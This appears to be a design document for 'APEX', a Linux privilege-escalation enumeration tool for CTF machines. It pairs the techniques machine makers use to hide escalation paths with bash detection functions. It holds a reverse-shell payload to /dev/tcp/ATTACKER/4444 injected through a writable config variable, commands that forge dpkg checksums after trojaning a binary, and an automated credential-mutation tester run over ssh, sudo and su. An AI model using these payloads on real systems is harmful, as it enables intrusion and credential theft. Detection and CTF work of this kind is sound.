# APEX — Adversarial Analysis
## How Makers Defeat Tools, How We Defeat Makers

---

## 1. The Arms Race We Must Win

Every tool ever written for privesc enumeration operates on known patterns.
CTF makers READ these tools. They design machines specifically to pass all
standard checks while hiding the real path.

This document catalogs EVERY known evasion technique a CTF maker can use,
and the exact APEX counter for each. If a technique is not listed here,
it is either a memory-corruption exploit (handled by Layer 7) or a novel
zero-day technique (handled by the adaptive layer fallback chain).

---

## 2. Category A: Path and Name Evasion

### A1: Legitimate-Looking Name in Legitimate Path

**Maker technique:**
```bash
# Custom evil binary placed at:
/usr/local/bin/updatedb     ← looks like standard updatedb
/usr/local/sbin/logrotated  ← looks like logrotate daemon
/usr/lib/systemd/system-helper ← looks like system component
```

**Why standard tools fail:**
LinPEAS looks for non-standard binaries. `/usr/local/bin` looks standard.
Name looks like a real system tool. Pattern matching fails.

**APEX counter:**
```bash
# Method 1: Package manager check (cannot be faked without root)
check_package_integrity() {
    local binary="$1"
    case "$PKG" in
        dpkg)
            dpkg -S "$binary" 2>/dev/null | grep -q "." || {
                echo "[NOT_PACKAGED] $binary — not from any package = CUSTOM"
                return 0  # confirmed custom
            }
            ;;
        rpm)
            rpm -qf "$binary" 2>/dev/null | grep -q "not owned" && {
                echo "[NOT_PACKAGED] $binary — custom binary"
                return 0
            }
            ;;
    esac
    return 1  # from package manager
}

# Method 2: Content analysis — real updatedb doesn't call /bin/bash
strings "$binary" 2>/dev/null | grep -E "^/bin/bash|^/bin/sh|chmod|setuid" && \
    echo "[SUSPICIOUS_STRINGS] $binary contains suspicious function calls"
```

### A2: Timestamp Forgery

**Maker technique:**
```bash
touch -t 202001010000 /usr/local/bin/evil_binary
# File appears to be from 2020 — before boot
# find -newer /proc/1/exe misses it
```

**APEX counter:**
Timeline alone is NOT our primary detection. Package manager integrity is primary.
Timeline is supplementary. Even with fake timestamp:
- `dpkg -S /usr/local/bin/evil_binary` → "not found" → CUSTOM → SIGNAL
- Strings analysis reveals behavior regardless of timestamp
- Binary size anomaly (100-byte "updatedb" vs 35KB real one) → SIGNAL

```bash
# Size sanity check
check_size_anomaly() {
    local binary="$1"
    local size=$(stat -c "%s" "$binary" 2>/dev/null)
    # Compare against known sizes for common system binaries
    # If /usr/bin/ls is 50 bytes — it's fake
    declare -A expected_min_sizes
    expected_min_sizes["/usr/bin/ls"]=50000
    expected_min_sizes["/usr/bin/find"]=100000
    expected_min_sizes["/usr/bin/python3"]=5000000
    
    local expected=${expected_min_sizes[$binary]:-0}
    [[ $expected -gt 0 && $size -lt $expected ]] && \
        echo "[SIZE_ANOMALY] $binary is suspiciously small ($size bytes, expected >$expected)"
}
```

---

## 3. Category B: Capability and Permission Evasion

### B1: Capabilities Instead of SUID

**Maker technique:**
```bash
# Remove SUID bit (students check SUID)
# Set capability instead (students don't check caps)
setcap cap_setuid+ep /usr/bin/python3

# find -perm -4000 → not found
# student: "no SUID binaries that matter"
# reality: python3 can setuid(0) directly
```

**APEX counter:**
APEX ALWAYS runs getcap separately from find -perm -4000.
They are independent checks. Missing one does not cause missing the other.

```bash
# This runs regardless of SUID findings:
apex_get_caps  # separate function, always called
```

### B2: Mount Namespace Divergence

**Maker technique:**
```bash
# Root's process runs in different mount namespace
# You see:  /opt/backup.sh world-writable
# Root sees: /opt/backup.sh from read-only overlay mount
# Your write never reaches what root executes
```

**APEX counter:**
```bash
detect_namespace_divergence() {
    # Compare our mount table vs root process mount tables
    local our_mounts=$(cat /proc/self/mounts 2>/dev/null)
    
    for pid in $(ls /proc | grep "^[0-9]"); do
        local uid=$(awk '/^Uid:/{print $2}' /proc/$pid/status 2>/dev/null)
        [[ "$uid" == "0" ]] || continue
        
        local root_mounts=$(cat /proc/$pid/mounts 2>/dev/null)
        if [[ "$our_mounts" != "$root_mounts" ]]; then
            echo "[NAMESPACE_DIVERGENCE] PID $pid has different mount table"
            echo "  Your /proc/self/mounts differs from root process mounts"
            echo "  CAUTION: File paths may resolve differently for root"
            echo "  Verify exploit path by checking /proc/$pid/root/ links"
            NAMESPACE_WARNING=1
        fi
    done
}
```

### B3: ACL (Access Control Lists) — Invisible to ls

**Maker technique:**
```bash
# File appears writable by group in ls output
# But ACL specifically denies current user
setfacl -m u:www-data:--- /opt/config.py
# ls shows: -rwxrwxr-x  but www-data cannot write despite group permission
```

**APEX counter:**
```bash
check_acl() {
    local file="$1"
    command -v getfacl >/dev/null 2>&1 || return
    
    local acl=$(getfacl "$file" 2>/dev/null)
    local current_user=$(whoami)
    
    # Check for explicit deny on current user
    echo "$acl" | grep -E "user:$current_user:.*-" && {
        echo "[ACL_DENY] $file explicitly denies $current_user via ACL"
        echo "  Standard permission check is MISLEADING for this file"
    }
    
    # Check for additional grants not visible in ls
    echo "$acl" | grep -E "user:$current_user:.*w" && {
        echo "[ACL_GRANT] $file grants write to $current_user via ACL"
        echo "  This path writable even if ls shows no permission"
    }
}
```

---

## 4. Category C: Execution Chain Evasion

### C1: Multi-Hop Chain (Students Stop at Hop 1)

**Maker technique:**
```bash
# /etc/crontab: * * * * * root /usr/local/bin/monitor.sh
# monitor.sh: not writable (student stops here)
# monitor.sh calls: /usr/lib/app/worker.py
# worker.py: not writable (student gives up)
# worker.py imports: from utils import config
# utils/config.py: WRITABLE (this is the path)
```

**APEX counter:**
Engine 2 (Deep Reader) follows ALL hops recursively up to 5 levels.
It does not stop at the first non-writable file. It reads every file
in the chain and checks writability at every level.

### C2: Environment Variable as Attack Vector

**Maker technique:**
```bash
# Root cron script:
#!/bin/bash
export BACKUP_DIR=/var/backups
source /etc/app/config
$BACKUP_CMD /home/user/*   ← BACKUP_CMD comes from config file
# config file: BACKUP_CMD=rsync  (seems safe)
# BUT: /etc/app/config is writable
# Change BACKUP_CMD to: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1 ; rsync"
```

**APEX counter:**
Config file reader specifically looks for variable assignments used as commands:
```bash
# Pattern: VARNAME=value followed by $VARNAME used as command
detect_var_as_command() {
    local script="$1"
    local content=$(cat "$script" 2>/dev/null)
    
    # Find variable assignments
    local vars=$(echo "$content" | grep -oE '^[A-Z_]+=[^;]+' | cut -d= -f1)
    
    # Check if any of these variables are used as commands
    for var in $vars; do
        echo "$content" | grep -E "\$$var\b|\${$var}" | \
            grep -vE "^#|echo|print" && {
                echo "[VAR_AS_CMD] Variable \$$var used as command in $script"
                # Find where var is set — is that location writable?
                local set_in=$(grep -l "$var=" /etc/app/* /etc/* 2>/dev/null)
                for setter in $set_in; do
                    [[ -w "$setter" ]] && {
                        echo "[VAR_INJECT] $setter writable — controls \$$var in $script"
                        register_finding "VAR_CMD_INJECT" "$setter" "$script" 85
                    }
                done
            }
    done
}
```

### C3: Decoy SUID (Patched Binary as Rabbit Hole)

**Maker technique:**
```bash
# Place patched vim with SUID bit
# vim GTFOBins exploit doesn't work — vim-tiny or specifically patched
# Student spends 45 minutes on this
# Real path is elsewhere

# Detection signal: binary is from package but SUID was added manually
# dpkg -S /usr/bin/vim → shows vim package
# but: dpkg -s vim | grep "^Status" → installed normally
# SUID was added POST-install → NOT standard
```

**APEX counter:**
```bash
detect_suid_anomaly() {
    find / -perm -4000 2>/dev/null | while IFS= read -r binary; do
        # Is this binary EXPECTED to have SUID?
        # Check if it's a known SUID binary from package
        case "$(basename $binary)" in
            # These are standard SUID binaries — normal
            passwd|su|sudo|mount|umount|ping|ping6|newgrp|chsh|chfn|at|crontab|pkexec)
                echo "[STANDARD_SUID] $binary — expected, lower priority"
                ;;
            # Everything else is non-standard SUID
            *)
                echo "[NONSTANDARD_SUID] $binary — investigate"
                # Check if package set this SUID or it was added manually
                local pkg_perms=$(dpkg -s "$(dpkg -S $binary 2>/dev/null | cut -d: -f1)" 2>/dev/null)
                register_finding "NONSTANDARD_SUID" "$binary" "suid_scan" 70
                ;;
        esac
    done
}
```

---

## 5. Category D: Detection Evasion

### D1: Package Database Tampering

**Maker technique:**
```bash
# Maker has root on their own machine (it's their CTF)
# After trojaning /usr/bin/python3:
# Update MD5 in dpkg database:
echo "/usr/bin/python3 $(md5sum /usr/bin/python3 | awk '{print $1}')" >> /var/lib/dpkg/info/python3.md5sums
# Now debsums -c shows CLEAN
```

**APEX counter:**
debsums is not our ONLY integrity check. We also:
1. Check binary behavior via strings analysis (payload strings visible)
2. Check library dependencies (unexpected .so = signal)
3. Check process behavior if possible
4. Cross-reference binary capabilities with expected functionality

```bash
# Even with tampered debsums:
strings /usr/bin/python3 2>/dev/null | grep -E "/bin/bash|system\(|execve|PAYLOAD" && \
    echo "[SUSPICIOUS_STRINGS] Binary contains unexpected strings despite debsums clean"
```

### D2: inotify-Triggered Processes (Invisible to pspy)

**Maker technique:**
```bash
# Process starts ONLY when specific file is modified
# Not running at scan time
# pspy shows nothing
# Standard enumeration shows nothing

# /usr/local/bin/file_watcher watches /home/user/trigger
# When trigger modified → runs privileged operation
```

**APEX counter:**
```bash
detect_inotify_watchers() {
    # Find processes using inotify
    for pid in /proc/[0-9]*/fd/*; do
        local target=$(readlink "$pid" 2>/dev/null)
        [[ "$target" == "inotify" ]] && {
            local watcher_pid=$(echo "$pid" | grep -oE '/proc/([0-9]+)/' | tr -d '/proc/')
            local watcher_cmd=$(cat "/proc/$watcher_pid/cmdline" 2>/dev/null | tr '\0' ' ')
            local watcher_uid=$(awk '/^Uid:/{print $2}' "/proc/$watcher_pid/status" 2>/dev/null)
            echo "[INOTIFY_WATCHER] PID $watcher_pid (uid=$watcher_uid): $watcher_cmd"
            [[ "$watcher_uid" == "0" ]] && {
                echo "  [HIGH] Root process using inotify — file modification may trigger execution"
                # Find what files it's watching via /proc/PID/fdinfo
                cat "/proc/$watcher_pid/fdinfo"/* 2>/dev/null | grep "inotify"
            }
        }
    done
    
    # Also: check for audit rules that trigger on file access
    safe_run "auditctl -l" 5 2>/dev/null | while IFS= read -r rule; do
        echo "[AUDIT_RULE] $rule — may trigger privileged action on file access"
    done
}
```

### D3: D-Bus Service Activation

**Maker technique:**
```bash
# Service is NOT running (invisible to ps, pspy)
# Service starts when D-Bus message received
# Service runs as root
# If we can send D-Bus message → trigger privileged operation
```

**APEX counter:**
```bash
detect_dbus_activation() {
    [[ $HAS_BUSCTL -eq 0 ]] && return
    
    busctl list 2>/dev/null | while IFS= read -r line; do
        local service=$(echo "$line" | awk '{print $1}')
        local pid=$(echo "$line" | awk '{print $3}')
        local uid=$(echo "$line" | awk '{print $4}')
        
        # Activatable services (PID = -)
        [[ "$pid" == "-" ]] && {
            echo "[DBUS_ACTIVATABLE] $service — starts on demand"
            # Check who runs it
            local service_file=$(find /usr/share/dbus-1 /etc/dbus-1 -name "${service}.service" 2>/dev/null)
            [[ -n "$service_file" ]] && {
                local run_as=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
                echo "  Runs as: ${run_as:-root}"
                [[ -z "$run_as" || "$run_as" == "root" ]] && \
                    echo "  [SIGNAL] Root D-Bus service — check if we can send activation message"
            }
        }
    done
}
```

---

## 6. Category E: Memory and Kernel-Level Attacks

### E1: Seccomp Blocking Our Execution Primitives

**Maker technique:**
```bash
# Machine has strict seccomp policy
# Blocks: execve, fork, clone, memfd_create, socket
# Our entire execution primitive chain is blocked

# Check:
cat /proc/self/status | grep Seccomp
# 2 = BPF filter active
```

**APEX counter:**
```bash
detect_seccomp_constraints() {
    local seccomp=$(grep "^Seccomp:" /proc/self/status 2>/dev/null | awk '{print $2}')
    
    case "$seccomp" in
        0) echo "[SECCOMP] Disabled — all syscalls available" ;;
        1) echo "[SECCOMP] STRICT mode — only read/write/exit/_exit/sigreturn allowed"
           echo "  [CRITICAL] Very restricted environment"
           echo "  Execution primitives severely limited"
           ;;
        2) echo "[SECCOMP] BPF filter active — some syscalls may be blocked"
           echo "  Testing available execution primitives..."
           test_execution_primitives_under_seccomp
           ;;
    esac
}

test_execution_primitives_under_seccomp() {
    # Test each primitive under seccomp
    # 1. Can we exec?
    /bin/true >/dev/null 2>&1 && echo "  exec: AVAILABLE" || echo "  exec: BLOCKED"
    
    # 2. Can we fork?
    (exit 0) >/dev/null 2>&1 && echo "  fork: AVAILABLE" || echo "  fork: BLOCKED"
    
    # 3. Can we use /dev/tcp?
    bash -c 'echo > /dev/tcp/127.0.0.1/1' 2>/dev/null && \
        echo "  /dev/tcp: AVAILABLE" || echo "  /dev/tcp: BLOCKED"
    
    # 4. Can we use memfd_create?
    python3 -c "import ctypes; ctypes.CDLL(None).memfd_create(b'',0); print('memfd: AVAILABLE')" \
        2>/dev/null || echo "  memfd: BLOCKED"
}
```

### E2: The "Everything Looks Clean" Machine

**Situation:** All DAC checks come back empty. No SUID issues. No sudo. No writable files
in execution graph. No kernel CVE. No container. No credentials.

This means one of:
1. We missed something (most likely — 95% of the time)
2. The path is through application logic (check open ports)
3. The path requires TOCTOU/race condition
4. The path is through kernel memory corruption

**APEX response:**
```bash
handle_empty_results() {
    echo ""
    echo "╔══════════════════════════════════════════════════════╗"
    echo "║  APEX: No confirmed paths found via DAC analysis     ║"
    echo "╠══════════════════════════════════════════════════════╣"
    echo "║  This does NOT mean the machine has no privesc path  ║"
    echo "╚══════════════════════════════════════════════════════╝"
    echo ""
    echo "CHECKLIST before giving up on DAC analysis:"
    echo "  □ Did you paste FULL sudo -l output (including env lines)?"
    echo "  □ Did you run getcap -r / separately?"
    echo "  □ Did you check /var/spool/cron/ for ALL users?"
    echo "  □ Did you check systemctl list-timers --all?"
    echo "  □ Did you run pspy for AT LEAST 3 minutes?"
    echo "  □ Did you check /etc/exports for NFS?"
    echo "  □ Did you check all user home directories for writable files?"
    echo "  □ Did you run debsums -c or rpm -Va?"
    echo ""
    echo "Activating Layer 6: pspy dynamic monitoring (3 minutes)..."
    echo "Activating Layer 7: Kernel CVE assessment..."
    echo ""
    echo "If all layers exhausted, check application logic:"
    # List open ports
    safe_run "$NET_TOOL -tlnp" 10
}
```

---

## 7. Category F: The Trap-Within-a-Trap

### F1: The Obvious Path Is Not The Real Path

CTF makers often put an obvious-looking privesc vector that doesn't work, to waste
time, while the real path is subtle.

**Example:**
```bash
# Machine has:
# 1. SUID vim — looks like GTFOBins → BUT vim is patched, doesn't work
# 2. /etc/crontab calls /opt/backup.sh — looks writable → BUT /opt is noexec
# 3. REAL PATH: /etc/crontab PATH line → /usr/local/bin writable → 
#    cron calls 'cleanup' without full path → create /usr/local/bin/cleanup

# Students spend hours on paths 1 and 2
# Never look at the PATH line in /etc/crontab
```

**APEX counter:**
Confidence scoring based on multiple-lens confirmation.
A single-lens finding gets lower confidence. Lower = try later.
Multi-lens confirmed finding gets highest confidence. Try first.

The cron PATH vector triggers:
- Lens 1: PATH line has writable directory
- Lens 2: Command called without full path
- Lens 3: Directory confirmed writable by find -writable
= 3 lenses = HIGH confidence

The SUID vim triggers:
- Lens 1: find -perm -4000 finds it
- Lens 2: strings analysis shows standard vim strings (no payload)
- Lens 3: debsums shows CLEAN (standard package)
= 1 lens positive, 2 lenses negative = LOW confidence

APEX ranks cron PATH higher than SUID vim.

### F2: Intentional Sensitive Data as Distraction

**Maker technique:**
```bash
# /home/user/.bash_history contains:
mysql -u root -p'password123'  ← student finds this
# Student tries password123 everywhere for 1 hour
# Doesn't work — it's a fake credential planted as distraction
```

**APEX counter:**
Credential DNA generates mutations AND tests them automatically.
If none of the mutations work within timeout → mark as LOW confidence.
Move to next vector. Don't spiral on one credential indefinitely.

```bash
# Credential testing with confidence decay
test_credential_with_timeout() {
    local user="$1"
    local password="$2"
    local mutations=($(generate_mutations "$password"))
    local matches=0
    
    for mutation in "${mutations[@]}"; do
        if test_ssh "$user" "$mutation" || test_sudo "$mutation" || test_su_root "$mutation"; then
            matches=$((matches + 1))
            echo "[CRED_MATCH] $user:$mutation works!"
        fi
    done
    
    [[ $matches -eq 0 ]] && {
        echo "[CRED_DEAD_END] No mutations of '$password' work on any service"
        echo "  This credential may be a planted distraction"
        echo "  Confidence: LOW — deprioritize this vector"
    }
}
```

---

## 8. The Ultimate Adversarial Summary

### What Makers CAN Do

| Technique | Our Counter | Confidence |
|-----------|------------|------------|
| Fake timestamps | Package integrity check | High |
| Legitimate-looking path | Package integrity + strings | High |
| Capabilities instead of SUID | Always run getcap separately | High |
| Multi-hop chains | Deep reader recursive follow | High |
| env_keep in sudo | Full sudo -l parse including env lines | High |
| Systemd timers not cron | Always check systemctl list-timers | High |
| .pth file injection | Always find all .pth files | High |
| EnvironmentFile injection | Deep read all unit files | High |
| Patched SUID as rabbit hole | Multi-lens scoring (low confidence) | Medium |
| Package DB tampering | Strings analysis as backup | Medium |
| Mount namespace divergence | Compare /proc/PID/mounts | Medium |
| D-Bus activation | busctl list check | Medium |
| inotify watchers | /proc/PID/fd inotify check | Medium |
| ACLs overriding DAC | getfacl check | Medium |

### What Makers CANNOT Do

| Constraint | Why |
|-----------|-----|
| Remove all execution primitives | Machine must be bootable — always one path |
| Create privesc without one of the 3 primitives | Mathematical constraint of Linux security model |
| Make package-untracked binary appear packaged | Needs to modify dpkg DB — detectable via hash |
| Hide from pspy for 3 full minutes | pspy reads /proc directly, no kernel bypass |
| Make a machine with zero attack surface | CTF machines MUST have an intended path |
